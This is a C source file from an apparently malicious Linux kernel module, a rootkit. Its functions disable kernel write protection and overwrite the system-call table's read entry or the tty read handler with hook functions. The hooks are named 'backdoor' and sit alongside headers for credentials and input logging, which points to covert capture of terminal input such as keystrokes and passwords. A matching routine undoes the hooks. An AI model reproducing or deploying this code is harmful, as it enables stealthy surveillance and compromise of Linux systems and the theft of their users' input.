#include <linux/tty.h>
#include <linux/delay.h>

#include "common.h"
#include "creds.h"
#include "backdoor.h"
#include "read.h"
#include "hook.h"
#include "inputlog.h"

void
backdoor_read(void)
{
    disable_protection();
    sys_calls[__NR_read] = (void *)g7_read;
    enable_protection();
}

void
backdoor_tty(void)
{
    if (!sys_tty_read) {
        sys_tty_read
            = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;

        disable_protection();
        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
            = (void *)g7_tty_read;
        enable_protection();
    }
}

void
unbackdoor(void)
{
    int cur;

    if (sys_tty_read) {
        disable_protection();
        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
            = (void *)sys_tty_read;
        enable_protection();

        while ((cur = atomic_read(&tty_read_count)) > 0)
            msleep(250);

        sys_tty_read = NULL;
    } else if (sys_read) {
        disable_protection();
        sys_calls[__NR_read] = (void *)sys_read;
        enable_protection();

        // Sleeping here is very important, as without it
        // we would stall the CPU...
        while ((cur = atomic_read(&read_count)) > 0)
            msleep(250);
    }
}
